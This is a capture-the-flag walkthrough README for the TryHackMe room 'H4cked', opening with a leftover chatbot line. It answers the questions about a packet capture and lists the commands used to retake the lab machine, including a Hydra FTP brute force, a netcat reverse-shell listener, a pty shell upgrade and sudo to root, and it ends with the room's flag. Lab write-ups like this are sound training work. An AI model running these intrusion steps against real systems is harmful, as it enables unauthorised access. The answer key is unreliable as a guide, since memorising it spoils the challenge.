# Day-18

Certainly! Here’s a revised version of the README.md file with altered phrasing to maintain originality:


# TryHackMe Room: H4cked

This walkthrough will guide you through the steps to solve the TryHackMe room ["H4cked"](https://tryhackme.com/r/room/h4cked).

## TASK 1: Oh no! We’ve been hacked!
First, download the task files. Once downloaded, open them with Wireshark.

### Questions and Answers:

### 1 It looks like our system was breached by an unknown attacker. Fortunately, we have a .pcap file from the attack. Can you determine what happened? Download the .pcap file and analyze it using Wireshark.##

``` Answer: No answer needed. ```

### 2 The attacker attempted to log into a specific service. What service was targeted?##

Answer: FTP

### 3 There is a well-known tool by Van Hauser used to brute-force various services. What is the name of this tool?##
ff
Answer: Hydra

### 4 The attacker attempted to log in with a specific username. What was the username?##

Answer: jenny

### 5 What was the password used by the attacker?##

Answer: password123

### 6 What was the current FTP working directory after the attacker logged in?##

Answer: /var/www/html

### 7 The attacker uploaded a malicious file. What was the filename of the backdoor?##

Answer: shell.php

### 8 The backdoor can be downloaded from a particular URL, as specified inside the uploaded file. What is the full URL?##

Answer: http://pentestmonkey.net/tools/php-reverse-shell

### 9 Which command did the attacker manually execute after obtaining a reverse shell?##

Answer: whoami

### 10 What is the hostname of the compromised machine?##

Answer: wir3

### 11 Which command was used by the attacker to spawn a new TTY shell?##

Answer: python3 -c ‘import pty; pty.spawn(“/bin/bash”)’

### 12 Which command was executed to gain root privileges?##

Answer: sudo su

### 13 The attacker downloaded something from GitHub. What is the name of the GitHub project?##

Answer: Reptile

### 14 The project can be used to install a stealthy backdoor on the system. What is this type of backdoor called?##

Answer: rootkit

## TASK 2: Hack your way back into the machine.
Deploy the machine.

###1 The attacker has changed the user's password! Can you replicate the attacker's steps and read the flag.txt? The flag is located in the /root/Reptile directory. Remember, you can always refer back to the .pcap file if needed. Good luck!##

Answer: No answer needed.

### Steps to Regain Access:

1. From the .pcap file, we know that FTP and HTTP services are accessible. Since the password was changed, we can use Hydra to brute-force the new password.

```sh
$ hydra -l jenny -P /home/overide/rockyou.txt ftp://10.10.141.210
```

2. Run Hydra (or a similar tool) on the FTP service to attempt to find the new password.

Answer: No answer needed.

3. Modify the necessary values inside the PHP reverse shell and upload it to the web server.

Answer: No answer needed.

4. Set up a listener on the designated port on your attacker machine and execute the web shell by visiting the .php file on the target server. ```get shell.php``` and ```put shell..php```

Answer: No answer needed.

### Steps to Gain Access:

- Wait for Hydra to complete and provide the password. In this example, the password is `987654321`.
- Log in to the FTP service using the obtained credentials and upload your PHP reverse shell.
- Start a netcat listener:

```sh
$ nc -lvnp [your chosen port]
```

- Trigger the shell by navigating to the uploaded PHP file in your browser.
- Stabilize the shell:

```sh
$ python3 -c ‘import pty; pty.spawn(“/bin/bash”)’
```

- Switch to the `jenny` user.
- Check sudo permissions with `sudo -l`.
- Gain root access by running:

```sh
$ sudo su
```

###5 Obtain root privileges!##

Answer: No answer needed.

###6 Navigate to the Reptile directory and read the flag.txt file.##

Answer: `ebcefd66ca4b559d17b440b6e67fd0fd`


